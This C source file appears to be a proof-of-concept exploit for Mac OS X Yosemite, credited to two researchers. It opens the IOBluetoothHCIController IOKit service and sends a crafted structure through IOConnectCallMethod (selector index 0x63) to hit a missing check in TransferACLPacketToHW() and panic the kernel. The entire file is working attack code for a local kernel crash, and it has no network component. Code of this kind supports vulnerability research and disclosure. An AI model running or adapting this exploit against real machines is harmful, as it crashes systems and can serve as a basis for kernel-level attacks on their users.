/*
 * crash-issue3.c: Written for Mac OS X Yosemite (10.10) by @rpaleari and @joystick.
 *
 * Exploits a missing check in
 * IOBluetoothHCIController::TransferACLPacketToHW() to trigger a panic.
 *
 * gcc -Wall -o crash-issue3{,.c} -framework IOKit
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

#include <IOKit/IOKitLib.h>

struct BluetoothCall {
  uint64_t args[7];
  uint64_t sizes[7];
  uint64_t index;
};

int main(void) {
  /* Finding vuln service */
  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
				IOServiceMatching("IOBluetoothHCIController"));

  if (!service) {
    return -1;
  }

  /* Connect to vuln service */
  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) {
    return kr;
  }

  printf(" [+] Opened connection to service on port: %d\n", port);

  struct BluetoothCall a;

  memset(&a, 0, sizeof(a));

  a.sizes[0] = 0x1000;
  a.args[0] = (uint64_t) calloc(a.sizes[0], sizeof(char));

  a.sizes[1] = 0x1000;
  a.args[1] = (uint64_t) calloc(a.sizes[1], sizeof(char));
  memset((void *)a.args[1], 0x22, 0x1000);


  /* Call DispatchHCISendRawACLData() */
  a.index = 0x63;

  /* Debug */
  for(int i = 0; i < 120; i++) {
    if(i % 8 == 0) printf("\n");
    printf("\\x%02x", ((unsigned char *)&a)[i]);
  }
  printf("\n");
  fflush(stdout);

  kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
			   (uint32_t) 0,       /* Selector */
			   NULL, 0,	       /* input, inputCnt */
			   (const void*) &a,   /* inputStruct */
			   sizeof(a),	       /* inputStructCnt */
			   NULL, NULL, NULL, NULL); /* Output stuff */
  printf("kr: %08x\n", kr);

  return IOServiceClose(port);
}